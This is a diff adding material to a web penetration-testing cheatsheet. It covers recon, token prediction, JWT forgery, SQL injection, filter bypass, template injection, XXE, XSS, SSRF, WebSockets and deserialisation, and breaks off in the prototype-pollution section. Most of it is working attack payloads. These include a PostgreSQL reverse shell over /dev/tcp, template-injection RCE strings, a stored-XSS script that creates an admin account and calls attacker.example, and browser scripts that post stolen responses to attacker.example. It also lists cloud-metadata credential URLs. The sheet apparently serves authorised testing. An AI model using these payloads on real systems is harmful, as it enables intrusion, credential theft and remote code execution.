@@ -1,7 +1,10 @@
+# Web cheatsheet
 
 If you are stuck, you skipped a checkbox.
 
 Do not start with a vulnerability scanner and then "manually verify". Start with the app study.
+
+Source code available? The white-box method is in [[whitebox_cheatsheet]].
 
 ---
 
@@ -20,6 +23,7 @@ Do not start with a vulnerability scanner and then "manually verify". Start with
 - [SQL injection](#sql-injection)
 - [NoSQL injection](#nosql-injection)
 - [OS command injection](#os-command-injection)
+- [Filter bypass](#filter-bypass)
 - [SSTI](#ssti)
 - [CSTI](#csti)
 - [XXE](#xxe)
@@ -27,14 +31,17 @@ Do not start with a vulnerability scanner and then "manually verify". Start with
 - [XPath / LDAP / CRLF](#xpath--ldap--crlf)
 - [XSS](#xss)
 - [CSRF](#csrf)
+- [Clickjacking](#clickjacking)
 - [CORS](#cors)
 - [Open redirect](#open-redirect)
 - [Path traversal, LFI, RFI](#path-traversal-lfi-rfi)
 - [File upload](#file-upload)
 - [SSRF](#ssrf)
 - [API and GraphQL](#api-and-graphql)
+- [WebSockets](#websockets)
 - [Cookies and sessions](#cookies-and-sessions)
 - [Deserialisation and ViewState](#deserialisation-and-viewstate)
+- [Prototype pollution](#prototype-pollution)
 - [Encryption](#encryption)
 - [HTTP request smuggling](#http-request-smuggling)
 - [Cache poisoning](#cache-poisoning)
@@ -43,6 +50,7 @@ Do not start with a vulnerability scanner and then "manually verify". Start with
 - [Misconfig](#misconfig)
 - [WordPress](#wordpress)
 - [Fingerprinting](#fingerprinting)
+- [Payload lists worth bookmarking](#payload-lists-worth-bookmarking)
 
 ---
 
@@ -153,11 +161,32 @@ API:
 - [ ] Other versions (`/v1` vs `/v2`) and other verbs
 - [ ] JSON weirdness (duplicate keys, `[{}]` vs `{}`, prototype pollution)
 - [ ] SOAP / GraphQL sitting next to the REST you found
+- [ ] WebSocket messages. Every field is a parameter nobody scanned
 - [ ] Race conditions
 
 Cache:
 
 - [ ] Unkeyed headers, cache deception, fat GET
+
+---
+
+## Toolbox
+
+| Job | Tool |
+|---|---|
+| proxy | Burp, with Collaborator (or `interactsh-client` when you have no Pro licence) |
+| Burp extensions | Autorize, Param Miner, HTTP Request Smuggler, Turbo Intruder, SAML Raider, InQL, DOM Invader |
+| names, ports, live hosts | `subfinder`, `dnsx`, `naabu`, `httpx`, `gowitness` |
+| content and parameters | `ffuf`, `dirsearch`, `gobuster`, `git-dumper` |
+| URL history | `gau`, `waymore`, `unfurl` |
+| SQL injection | `sqlmap` (after you confirmed by hand) |
+| tokens and sessions | `jwt_tool`, `hashcat`, `flask-unsign` |
+| deserialisation | `ysoserial`, `ysoserial.net`, `phpggc` |
+| template injection | `SSTImap` |
+| crypto | `padbuster` / `padre`, `hashpump` |
+| WebSockets | Burp WebSockets history, `websocat` |
+| CMS | `wpscan` |
+| fingerprinting | `nuclei -tags tech`, `whatweb` |
 
 ---
 
@@ -180,10 +209,10 @@ dnsx -l subdomains.txt -a -resp-only -silent | sort -u > ips.txt
 asnmap -i "$(head -1 ips.txt)" -silent | mapcidr -silent > asn_cidrs.txt
 
 naabu -l ips.txt -tp 1000 -rate 500 -silent -o ports.txt   # ip:port
-httpx -l subdomains.txt -silent -o urls.txt
-httpx -l urls.txt -sc -title -td -cdn -silent -o httpx.txt
+httpx -l subdomains.txt -silent -o live_urls.txt
+httpx -l live_urls.txt -sc -title -td -cdn -silent -o httpx.txt
 
-gowitness scan file -f urls.txt --threads 20 --write-db
+gowitness scan file -f live_urls.txt --threads 20 --write-db
 gowitness report server 127.0.0.1:7171
 ```
 
@@ -204,7 +233,7 @@ done < ports.txt | tee nmap-scan.txt
 Historical URLs (old parameters are still the best parameters):
 
 ```bash
-gau --subs "$D" | tee urls.txt
+gau --subs "$D" | tee urls.txt                 # history, not the live list above
 waymore -i "$D" -mode U -oU waymore_urls.txt
 cat urls.txt waymore_urls.txt | unfurl keys | sort | uniq -c | sort -n
 ```
@@ -237,7 +266,7 @@ A sequence that does not waste an afternoon:
 4. Fuzz parameters and POST bodies with `ffuf`, not more directories.
 
 ```bash
-ffuf -w /usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
+ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
   -u https://victim.example/login.php \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   -d 'username=admin&password=FUZZ' \
@@ -349,6 +378,34 @@ POST /reset
 token=YOUR_TOKEN&email=victim@victim.example&password=NewPass1
 ```
 
+5. PHP backend comparing the token with `==`? Send `0`, or JSON `true`. See [[PHP Type Juggling and Magic Hashes]].
+
+### Weak tokens
+
+A reset token, session id, invite code or API key is only as good as the generator behind it. Request five for your own account and look at them side by side before anything else.
+
+| What you see | What it probably is | Attack |
+|---|---|---|
+| 32 hex chars that change with the second | `md5(time())`, `md5(microtime())`, `md5(email . time())` | rebuild every value in a window around the server's `Date` header |
+| 13 hex chars, increasing | PHP `uniqid()`: seconds and microseconds in hex | first 8 chars are the Unix time; brute the last 5 |
+| digits or letters from PHP `mt_rand()` / `rand()` | Mersenne Twister with a 32-bit seed | recover the seed from one output with `php_mt_seed`, then predict |
+| values from `java.util.Random` | 48-bit linear generator | two consecutive `nextInt()` or one `nextLong()` give the state; a time-seeded one falls to a millisecond brute force |
+| `Math.random()` in Node | xorshift128+ | recoverable from a few outputs; hard, try everything else first |
+| UUID with a `1` as the first digit of the third group | UUIDv1: timestamp and MAC | request one before and one after the victim's, brute the timestamps between |
+| short numeric code | 4 to 6 digits | brute force, if nothing rate-limits it |
+
+`uniqid()` and `rand()` being an alias of `mt_rand()` were both confirmed on PHP 7.4 and 8.3.
+
+The pattern for time-based tokens:
+
+1. Trigger the token for the victim. Keep the response: its `Date` header is the server's clock.
+2. Generate every candidate for a couple of seconds either side (with milliseconds, that is a few thousand).
+3. Try them against the reset endpoint.
+
+Code for the window, and a `java.util.Random` predictor, is in [[Exploit skeleton (Python)]]. With source access you do not guess the formula, you read it: see [[whitebox_cheatsheet#Auth and session code]].
+
+If you already have SQL injection, skip all of this and read the token out of the database.
+
 ### 2FA
 
 Common holes, in the order you should try them:
@@ -377,6 +434,15 @@ https://idp.example/authorize
   &scope=openid email profile
   &state=...
 ```
+
+Login bounces you to another host and back? That is OAuth. Ask the IdP what it supports before you poke at it:
+
+```
+/.well-known/openid-configuration
+/.well-known/oauth-authorization-server
+```
+
+The answer lists the endpoints, the allowed `response_types`, and sometimes a `registration_endpoint`. If you can register a client yourself, every URL field in that request (`logo_uri`, `jwks_uri`, `sector_identifier_uri`) is a candidate for [SSRF](#ssrf).
 
 Things that actually pay:
 
@@ -465,7 +531,15 @@ python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
 
 Then mint `role=admin`.
 
-**Key confusion.** Token is RS256. Server has a public key (often at `/jwks.json` or baked into the mobile app). Send HS256 signed *with the public key as the HMAC secret*. `jwt_tool -X k`.
+**Key confusion.** Token is RS256. Server has a public key (often at `/jwks.json` or baked into the mobile app). Send HS256 signed *with the public key as the HMAC secret*.
+
+```bash
+python3 jwt_tool.py <token> -X k -pk public.pem     # key confusion
+python3 jwt_tool.py <token> -X a                     # alg:none variants
+python3 jwt_tool.py <token> -X i                     # inject an inline JWK and sign with it
+python3 jwt_tool.py <token> -X s -ju https://attacker.example/jwks.json    # spoofed JWKS
+python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p 'cracked-secret'   # change a claim, re-sign
+```
 
 **`kid` tricks.**
 
@@ -590,6 +664,31 @@ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE
 UNION SELECT 1,group_concat(user,0x3a,pass),3 FROM users--
 ```
 
+### Error based
+
+When the app prints database errors, make the error carry the data. One request per value.
+
+```
+# PostgreSQL
+' AND 1=CAST((SELECT version()) AS int)--
+# MySQL
+' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
+# MSSQL
+' AND 1=CONVERT(int,(SELECT @@version))--
+```
+
+The PostgreSQL line was run on 16; the other two are from the PortSwigger sheet.
+
+### Boolean (blind)
+
+No output and no error, but the page differs between true and false. Ask one yes/no question per request and binary-search each character:
+
+```
+1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1))>77
+```
+
+`SUBSTRING(x FROM n FOR 1)` works on PostgreSQL and MySQL. MSSQL wants `SUBSTRING(x,n,1)`, Oracle and SQLite `SUBSTR(x,n,1)`. Seven requests per character; nobody does this by hand. The loop is in [[Exploit skeleton (Python)]].
+
 ### Time based (blind)
 
 Use the right sleep for the engine:
@@ -613,6 +712,24 @@ Use the right sleep for the engine:
 
 Out of band when you have Collaborator and `xp_dirtree` / `copy` / `LOAD_FILE` / `UTL_HTTP`.
 
+### Not in a WHERE clause
+
+The injection point decides the payload. All three were run on PostgreSQL 16:
+
+```
+# ORDER BY: no UNION possible, so make the false case an error
+?sort=(CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)
+
+# LIMIT
+?limit=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)
+
+# INSERT / UPDATE value: you are inside a string in a value list
+name=a'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) END)||'b
+name=a'||(SELECT version())||'b          → stored, shown wherever the name is displayed
+```
+
+Second-order: the value is stored safely and concatenated into a different query later (a report, an admin list, a nightly job). The request that injects is not the request that fires. With source, grep for queries built from columns you can write.
+
 ### Stacked / RCE-ish
 
 MSSQL (if `xp_cmdshell` can be turned on — noisy, ask before you do this on a client DB):
@@ -629,6 +746,15 @@ MySQL file read / write (needs `FILE` privilege and a writable web root):
 UNION SELECT LOAD_FILE('/etc/passwd')--
 UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/cmd.php'--
 ```
+
+PostgreSQL, as a superuser with stacked statements:
+
+```sql
+'; CREATE TABLE o(l text); COPY o FROM PROGRAM 'id'; --
+'; COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"'; --
+```
+
+File read and write, large objects, and a C function you upload when `COPY … PROGRAM` is not an option: [[PostgreSQL SQLi to RCE]].
 
 ### sqlmap
 
@@ -762,7 +888,81 @@ Reverse shell only after you know the injection works. URL-encode the whole thin
 8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
 ```
 
-Listener: `nc -lvnp 9001`. WAF in the way: base64 the inner command, or split it (`wh''oami`, `${IFS}`).
+Listener: `nc -lvnp 9001`. WAF in the way: base64 the inner command, or split it (`wh''oami`, `${IFS}`). More in [Filter bypass](#filter-bypass).
+
+---
+
+## Filter bypass
+
+A filter is code, and it has bugs like any other code. With source, read the exact regex or character list and find the input it lets through. Without source, send one character class at a time and note what dies.
+
+Everything in this section was run (PHP 7.4 and 8.3, Python 3, Node, bash) unless marked.
+
+### Regex mistakes
+
+| Mistake | Example check | What passes |
+|---|---|---|
+| No anchors | `preg_match('/[a-z]+/', $x)`, Python `re.match(r'\d+', x)` | `abc;id`, `123;id`: one matching piece anywhere is enough |
+| `$` allows a trailing newline | PHP `/^[a-z]+$/`, Python `re.match(r'^\d+$', x)` | `abc%0a`. PHP needs the `D` flag or `\z`; Python needs `fullmatch` or `\Z`. JavaScript `$` is strict |
+| Multiline flag | `/^admin$/m` in PHP, Python or JS | `x%0aadmin`: any one line may match |
+| `.` does not match a newline | blacklist `/select.+from/i` | `select%0afrom` is not seen (unless the `s` flag is set) |
+| Unescaped dot | `^https://victim.example/` | `https://victimXexample/` |
+| `preg_match` returns `false` on error | `if (preg_match($bad, $x)) die();` | input that hits the backtrack limit (`/^(a+)+$/` against 5000 `a` and a `!`) returns `false`, which reads as "clean". On PHP 7 an array (`x[]=`) does the same; PHP 8 throws |
+| Global regex reused | JS `const r = /^admin$/g; r.test(x)` | the same input alternates true, false, true: send it twice |
+| Replace runs once | `str_replace('../', '', $p)`, JS `s.replace('<script>', '')` | `....//` becomes `../`; JS string replace only removes the first hit |
+| Case | `in_array($ext, ['php'])`, `pathinfo()` | `shell.pHp`: neither lowercases for you |
+
+### Order of operations
+
+The filter sees one form, the sink another:
+
+- **Check, then decode.** Filter on the raw value, `urldecode` afterwards: `%2527` is `%27` at the filter and `'` at the query. Same idea with base64, JSON `'`, HTML entities.
+- **Check, then normalise.** Case mapping and Unicode normalisation create characters that were not there: `ı` uppercases to `I`, `ſ` to `S`, the Kelvin sign `K` lowercases to `k`, and NFKC turns fullwidth `＜script＞` into `<script>`.
+- **Check one type, use another.** `x[]=` arrives as an array, JSON `true` as a boolean. See [[PHP Type Juggling and Magic Hashes]].
+
+### No quotes, spaces, commas or parentheses
+
+SQL (PostgreSQL forms run on 16; more in [[PostgreSQL SQLi to RCE]]):
+
+```sql
+SELECT $$admin$$                           -- PostgreSQL string without quotes
+SELECT CHR(97)||CHR(100)                   -- PostgreSQL / Oracle
+SELECT 0x61646d696e                        -- MySQL hex string (not run here)
+SELECT/**/1          SELECT(1)WHERE(1=1)   -- no spaces; %09 and %0a also separate
+SUBSTRING(x FROM 1 FOR 1)                  -- no comma
+LIMIT 1 OFFSET 2                           -- no comma
+SELECT * FROM (SELECT 1)a CROSS JOIN (SELECT 2)b   -- two columns without a comma
+```
+
+Shell:
+
+```bash
+cat${IFS}/etc/passwd            # no space
+{cat,/etc/passwd}               # no space
+cat</etc/passwd                 # no space
+X=$'\x2fetc\x2fpasswd';cat $X   # no slash
+${HOME:0:1}                     # a slash from a variable
+w''hoami   w""hoami   who\ami   # break up a blacklisted word
+/usr/bin/wh?ami                 # glob instead of the name
+echo aWQ=|base64 -d|sh          # nothing recognisable at all
+```
+
+A newline (`%0a`) separates commands as well as `;` does, and filters forget it.
+
+JavaScript:
+
+```javascript
+alert`1`                                   // call without parentheses
+eval(atob('YWxlcnQoMSk='))                 // nothing recognisable
+String.fromCharCode(97,108,101,114,116)    // a string without quotes
+```
+
+PHP, when function names are blacklisted:
+
+```php
+("sys"."tem")("id");
+$f = "sys"."tem"; $f("id");
+```
 
 ---
 
@@ -789,7 +989,27 @@ Jinja2 RCE (Flask):
 {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
 {{lipsum.__globals__['os'].popen('id').read()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
 ```
+
+`lipsum`, `cycler`, `joiner` and `namespace` exist in every Jinja2 environment, Flask or not. `request` and `config` are Flask only.
+
+No handy global? Walk the class tree and pick `Popen` by name, not by index (the index moves between Python versions):
+
+```
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('id',shell=True,stdout=-1).communicate()[0] }}{% endif %}{% endfor %}
+```
+
+Filtered characters:
+
+```
+{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}      no dots
+{{lipsum['__globals__']['os']['popen']('id')['read']()}}                                         no dots
+{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}   no underscores
+{%print(lipsum.__globals__.os.popen('id').read())%}                                              no {{ }}
+```
+
+All of the Jinja2 lines above ran on Jinja2 3.1.6. A `SandboxedEnvironment` blocks them (`SecurityError`); then you need a sandbox escape for that exact version, not a longer payload.
 
 Freemarker:
 
@@ -809,6 +1029,19 @@ Twig (older):
 ```
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 ```
+
+Twig 2 and 3 (`_self.env` is gone), plus the usual Java and Node engines. None of these were run for this note; check them against the engine version you face:
+
+```
+{{['id']|filter('system')}}                                         Twig 2/3
+${T(java.lang.Runtime).getRuntime().exec('id')}                     Spring EL
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x             Thymeleaf, in a view name or fragment
+#set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('id')     Velocity
+<%= process.mainModule.require('child_process').execSync('id') %>   EJS
+#{process.mainModule.require('child_process').execSync('id')}       Pug
+```
+
+With source, do not fingerprint: look at the imports and the render call. The bug is always the same line, a template *string* built from input (`render_template_string(x)`, `new Template(x)`, `Twig\Environment::createTemplate($x)`, `ejs.render(x)`). A fixed template file with your value passed in as data is not SSTI. `SSTImap` automates the black-box part.
 
 If it renders `{{7*7}}` as `49` in an *email* or a *PDF*, that is still RCE, just second-order. Registration name fields are a favourite.
 
@@ -908,6 +1141,23 @@ And `x.dtd`:
 ```
 
 Parameter entities (`%`) when named entities are blocked. `php://filter/convert.base64-encode/resource=/etc/passwd` when the file has XML-breaking characters.
+
+No outbound connection, but parser errors are shown? Put the file content into a path that cannot exist, and read it out of the error. Hosted DTD version (from the PortSwigger material, not run here):
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+Cannot host a DTD either? Redefine an entity of a DTD that already exists on the server (`/usr/share/yelp/dtd/docbookx.dtd` and friends); the trick and a list of usable local DTDs are in PayloadsAllTheThings.
+
+Limits worth knowing before you burn an hour:
+
+- The out-of-band URL trick breaks on the first newline in most parsers. `/etc/hostname` works, `/etc/passwd` usually does not. Use error-based, or `php://filter` base64 on PHP.
+- Java: `file:///etc/` on a directory returns a listing. Old Java versions also allowed multi-line exfiltration over `ftp://`.
+- In a white-box test, the question is how the parser is configured: `LIBXML_NOENT` or `LIBXML_DTDLOAD` in PHP, a `DocumentBuilderFactory` without `disallow-doctype-decl` in Java, `XmlResolver` not null or `DtdProcessing.Parse` in .NET.
 
 SVG / SOAP / docx: unzip, infect `[Content_Types].xml` or a `.rels` file, rezip.
 
@@ -1026,9 +1276,50 @@ The payload comes back in *this* response. Send the victim a link. Shorten, wrap
 
 WAF: case (`<ScRiPt>`), encoding (`%3cscript%3e`), double encoding, `srcdoc`, `svg/onload`, breaking out of the exact context you are in. Context beats lists.
 
+The same `<img src=1 onerror=alert()>`, written so a naive filter misses it. Combine them:
+
+```
+<img src=1 oNeRRoR=alert()>                                       case
+<img src=1 onerror=alert``>                                       no parentheses
+<img src=x onerror="&#x61;lert(1)">                               HTML entity inside the attribute
+<a href="javascript&#00000000000058;alert(1)">x</a>               entity with leading zeros
+<img src=1 onerror=alert()>              JS unicode escapes
+%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%29%3e
+```
+
 ### Stored
 
 Payload sits in the DB and hits every visitor of that page. Admin panels, support tickets, display names, file names, logs, markdown profiles. One payload, many victims. Check the admin app on a different host — cookie `Domain=.victim.example` may still send.
+
+Blind: the page that renders your payload is one you cannot see (back office, log viewer, PDF export). Use a payload that loads a script from your server, so the hit itself tells you where it fired:
+
+```
+"><script src=https://attacker.example/x.js></script>
+```
+
+### Stored XSS to admin action
+
+A stored XSS in front of an admin is an authentication bypass. Do not steal the cookie (it is `HttpOnly` anyway). Make the admin's browser do the admin's work:
+
+1. Fetch a page that contains a CSRF token, with the admin's session.
+2. Pull the token out of the HTML.
+3. Send the privileged request: create an admin user, change an e-mail, enable a plugin, upload a file.
+4. Report back to your server so the script knows it happened.
+
+```javascript
+(async () => {
+  const page = await (await fetch('/admin/users/new', {credentials: 'include'})).text();
+  const token = (page.match(/name="csrf_token"\s+value="([^"]+)"/) || [])[1];
+  await fetch('/admin/users', {method: 'POST', credentials: 'include',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: new URLSearchParams({csrf_token: token, username: 'pwn', password: 'Pwn12345!', role: 'admin'})});
+  fetch('https://attacker.example/done', {mode: 'no-cors'});
+})();
+```
+
+Same origin, so no CORS problem and the anti-CSRF token protects nothing. The full version, with the server that hosts it and waits for the callback, is in [[Exploit skeleton (Python)]].
+
+Short field? Store only `<script src=//attacker.example/x.js></script>` and keep the logic on your side.
 
 ### DOM XSS
 
@@ -1058,6 +1349,14 @@ The source is the hash. `$()` will parse HTML if you feed it a tag:
 Victim opens your page → iframe loads the app → `onload` appends the payload to the hash → `hashchange` fires → sink.
 
 In DevTools Debugger, Ctrl+F for `<script`, then for `innerHTML` / `hash` / `eval`. That is the whole method.
+
+`postMessage` is a source people forget. Search for `addEventListener('message'` and check whether the handler tests `event.origin`. If it does not, any page that frames or opens the app can feed it:
+
+```html
+<iframe src="https://victim.example/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"></iframe>
+```
+
+Burp's DOM Invader (in the embedded browser) finds sources, sinks and message handlers faster than reading minified code.
 
 ### HTML injection, no JS
 
@@ -1101,9 +1400,19 @@ JSON-ish with `text/plain` (no preflight):
 </form>
 ```
 
-Bypasses worth trying: drop the token, empty token, token from another account, token in the cookie only, switch POST → GET, switch JSON → form, method override `_method=PUT`, flash a file upload (no CORS preflight on simple form POST).
+Bypasses worth trying: drop the token, empty token, token from another account, token in the cookie only, switch POST → GET, switch JSON → form, method override `_method=PUT`. File uploads are forgeable too: a `multipart/form-data` form POST needs no CORS preflight.
 
 Login CSRF is a thing: force the victim into *your* account, wait for them to attach a credit card / OAuth.
+
+---
+
+## Clickjacking
+
+The app can be framed, and one click inside the frame does something that matters (delete, approve, change e-mail, grant OAuth consent).
+
+Check the response headers: no `X-Frame-Options` and no `frame-ancestors` in the CSP means it frames. Then prove it with a page that puts the invisible app over a decoy button. Template: [[CSRF templates]].
+
+Only worth reporting with a real one-click action behind it. "The login page can be framed" is a hardening note.
 
 ---
 
@@ -1273,11 +1582,49 @@ shell.asp;.jpg
 
 Content-Type: `image/jpeg` with PHP inside. Magic bytes: `GIF89a;<?php system($_GET['c']); ?>`. Polyglot PDF/PHP, JPEG/JS.
 
-`.htaccess` into an upload dir:
+How the filter usually fails (PHP behaviour checked on 7.4 and 8.3):
+
+- It takes the **last** extension (`pathinfo()` gives `jpg` for `shell.php.jpg`) while Apache with a loose handler config executes on **any** `.php` in the name.
+- It compares case-sensitively: `in_array('pHp', ['php'])` is false, so a blacklist lets `shell.pHp` through.
+- Its regex ends in `$`: `/\.(jpg|png)$/` accepts `shell.jpg%0a`.
+- It trusts `Content-Type` or the first bytes, both of which you set.
+- It checks the name and then saves under a name built from something else you control.
+
+Config files instead of code, when you can write into a served directory:
+
+`.htaccess` (Apache, if `AllowOverride` permits):
 
 ```
 AddType application/x-httpd-php .jpg
 ```
+
+`.user.ini` (PHP under FPM or CGI; picked up after a cache delay, five minutes by default). Not run here:
+
+```
+auto_prepend_file=shell.jpg
+```
+
+`web.config` (IIS) can map a handler or run code from inside the config file itself; payloads are in PayloadsAllTheThings.
+
+Archives. An upload feature that unpacks a zip or tar (themes, plugins, imports, backups) rarely checks the names inside:
+
+```
+../../../../var/www/html/shell.php          entry name with traversal ("zip slip")
+link -> /etc/passwd                          symlink entry, then download "link"
+```
+
+Build both with the `evil_zip` helper in [[Exploit skeleton (Python)]]. Python's `zipfile` keeps the names exactly as given.
+
+What to overwrite when you can write anywhere but not execute directly:
+
+```
+~/.ssh/authorized_keys          your public key, then ssh in
+a template or view file         rendered on the next request
+webapps/ROOT/x.jsp              Tomcat picks it up
+a cron file or a script that a scheduled job runs
+```
+
+Race: some apps save the file, check it, then delete it. Request it in a loop while you upload.
 
 SVG → XSS:
 
@@ -1321,21 +1668,60 @@ Cloud:
 # AWS IMDSv1
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-# AWS IMDSv2 — you need the token PUT first, so chain or hope the app follows redirects
+# AWS IMDSv2: a PUT with a header first, then the token on every GET.
+# A GET-only SSRF cannot do this; you need control of method and headers (or code execution).
+PUT http://169.254.169.254/latest/api/token
+#   header: X-aws-ec2-metadata-token-ttl-seconds: 21600
+GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#   header: X-aws-ec2-metadata-token: <token>
+
+# AWS ECS / Fargate: the path is in the container's environment (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+http://169.254.170.2/v2/credentials/<guid>
+
 # GCP
-http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 # header: Metadata-Flavor: Google
 
 # Azure
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
 # header: Metadata: true
 ```
 
+What to do with the credentials: [[AWS Offensive Field Guide]].
+
 Bypasses when `http://127.0.0.1` is blocked: redirect from a host you own, DNS rebinding (short TTL that flips from a public IP to `127.0.0.1`), decimal/octal/IPv6, a name that resolves to loopback (`127.0.0.1.nip.io`), `file://`, `gopher://`, `dict://`, `smb://`.
 
-Blind: Collaborator DNS is enough to prove it. Then hit internal hosts from JS (`admin.internal`, `redis:6379`, `http://169.254.169.254/`). `gopher://` still talks to Redis/Memcached/SMTP on some stacks.
+The validator and the HTTP client often parse the same URL differently. Aim for the gap:
+
+```
+http://victim.example@attacker.example/          userinfo: the host is attacker.example
+http://attacker.example#@victim.example/         fragment
+http://attacker.example\@victim.example/         backslash, parsers disagree
+http://victim.example.attacker.example/          suffix check
+http://attacker.example/?x=victim.example        "contains" check
+```
+
+Blind: Collaborator DNS is enough to prove it. Then use the SSRF itself to reach internal hosts (`admin.internal`, `redis:6379`, `http://169.254.169.254/`): status codes, response times and error text tell open from closed. `gopher://` still talks to Redis/Memcached/SMTP on some stacks, because it lets you write raw bytes:
+
+```
+gopher://127.0.0.1:6379/_SET%20x%20y%0D%0A
+```
+
+In a microservice setup the prize is usually an internal API that trusts everything on its network: an admin port of the gateway, a job runner, a config service. Enumerate hosts and ports through the SSRF, then read that service's API docs.
 
 HTML in a PDF renderer is SSRF with extra steps: `<iframe src="http://127.0.0.1:6379">`.
+
+A renderer that is a headless browser runs your JavaScript inside the network. That is better than SSRF: a script can scan, read same-origin responses and send them out.
+
+```html
+<script>
+fetch('http://127.0.0.1:8001/').then(r => r.text())
+  .then(t => fetch('https://attacker.example/x', {method: 'POST', mode: 'no-cors', body: t}));
+</script>
+```
+
+Cross-origin responses are still opaque to the script, so point it at what the page's own origin can read, or use it as a blind port scanner.
 
 ---
 
@@ -1416,6 +1802,46 @@ query {
 
 ---
 
+## WebSockets
+
+A WebSocket is one HTTP handshake followed by messages in both directions. Scanners and most testers stop at the handshake, so the messages are where the untested input is.
+
+Find it: Burp → Proxy → WebSockets history. Send a message to Repeater and edit it like any request. In the JS, search for `new WebSocket(`, `io(` (Socket.IO), `SockJS`.
+
+From the terminal:
+
+```bash
+websocat -H 'Cookie: session=...' wss://victim.example/ws
+```
+
+What to test:
+
+- **Every field of every message is a parameter.** Same payloads as over HTTP: SQL injection, command injection, XSS when messages are rendered to other users, IDOR on any id in the frame.
+- **Authorisation only at the handshake.** The socket was opened as a user; does each message check what that user may do? Send an admin-only message type from a normal session.
+- **Message types the UI never sends.** They are listed in the client JS.
+- **No `Origin` check and cookie authentication** is cross-site WebSocket hijacking: your page opens the socket with the victim's cookies and reads the replies. CSRF, but with a response.
+
+```html
+<script>
+const ws = new WebSocket('wss://victim.example/ws');
+ws.onopen = () => ws.send('{"action":"history"}');
+ws.onmessage = e => fetch('https://attacker.example/x', {method: 'POST', mode: 'no-cors', body: e.data});
+</script>
+```
+
+Command injection through a message looks exactly like the HTTP version. Usually it is blind, so use a delay or a callback:
+
+```
+{"action":"ping","host":"127.0.0.1; sleep 5"}
+{"action":"ping","host":"127.0.0.1; curl http://10.10.10.10:8000/$(id|base64 -w0)"}
+```
+
+Socket.IO wraps messages in its own framing. On the wire a client event is `42["eventName",{...}]`, `40` opens the namespace, and `2`/`3` are ping and pong. Send the frame in that shape or the server ignores it. (Framing as documented; not run here.)
+
+A scriptable client is in [[Exploit skeleton (Python)]]; it was run against a test server with exactly this kind of injection.
+
+---
+
 ## Cookies and sessions
 
 ```
@@ -1448,6 +1874,14 @@ The server turns a blob you hold back into objects. If you can pick the class, y
 
 Signs: cookie starting `O:` (PHP), `rO0` / `aced` (Java), `pickle` / `gASV` (Python), `.NET` ViewState `__VIEWSTATE=`, Node `{"rce":"_$$ND_FUNC$$_..."}`, Ruby `Marshal`.
 
+.NET has more than ViewState: base64 starting `AAEAAAD/////` is BinaryFormatter, `/wE` is LosFormatter, JSON with `"$type"` is Json.NET with type names on. Gadgets, ysoserial.net usage and the white-box grep are in [[Deserialization (.NET)]].
+
+Other places the same bug hides:
+
+- PHP `phar://` in any file function (`file_exists`, `fopen`, `getimagesize`) deserialises the archive's metadata, up to PHP 7.4. PHP 8 stopped doing that automatically.
+- YAML: `yaml.load(x)` without a safe loader in Python, `new Yaml().load(x)` in Java (SnakeYAML before 2.0).
+- Java beyond `ObjectInputStream`: `XMLDecoder`, XStream, Jackson with default typing.
+
 PHP (phpggc):
 
 ```bash
@@ -1459,6 +1893,7 @@ Java (ysoserial):
 
 ```bash
 java -jar ysoserial.jar CommonsCollections6 'curl http://YOUR-COLLAB' | base64 -w0
+java -jar ysoserial.jar URLDNS 'http://YOUR-COLLAB' | base64 -w0       # safe probe: only a DNS lookup, needs no library
 ```
 
 Python pickle — do not paste a gadget into a client's prod until you know it is pickle. The probe is a Collaborator DNS from `__reduce__`.
@@ -1470,6 +1905,38 @@ Node `node-serialize`:
 ```
 
 ViewState: if MAC is off, `ysoserial.net`. If MAC is on, you need `machineKey` (often in `web.config`, aspnet leak, or Blacklist3r on a weak key). ViewState without MAC is the finding; RCE is the encore.
+
+---
+
+## Prototype pollution
+
+JavaScript only. A recursive merge copies your `__proto__` key into `Object.prototype`, and from then on every object in the process (or the page) has the property you planted.
+
+Server-side, in a JSON body:
+
+```json
+{"__proto__":{"isAdmin":true}}
+```
+
+Detect it without source and without breaking the app:
+
+```json
+{"__proto__":{"status":510}}
+```
+
